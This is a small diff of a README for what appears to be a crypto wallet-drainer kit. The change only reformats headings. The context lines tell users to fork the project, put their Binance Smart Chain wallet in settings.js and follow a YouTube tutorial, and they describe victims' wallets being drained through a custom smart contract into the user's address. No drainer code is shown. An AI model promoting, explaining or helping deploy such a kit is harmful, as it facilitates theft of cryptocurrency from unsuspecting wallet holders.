@@ -56,7 +56,7 @@ info on how to fork https://www.youtube.com/watch?v=f5grYMXbAV0
 
 !!!
 
-my youtube tutorial https://youtu.be/ESxOvW-IOg0
+### my youtube tutorial https://youtu.be/ESxOvW-IOg0 ###
 
 !!!!!!!!!!!!!
 
@@ -65,7 +65,7 @@ Fork ---------->  add your bsc wallet to settings.js file  ------> Go to  https:
 
 !!!!!! Make sure you add your wallet to settings.js file !!!!!!!
 
-HOW IT WORKS
+### HOW IT WORKS FOR FREE VERSION ###
 
 Wallet gets drained ----> CUSTOM SMART CONTRACT -----> YOUR BSC ADDRESS
 
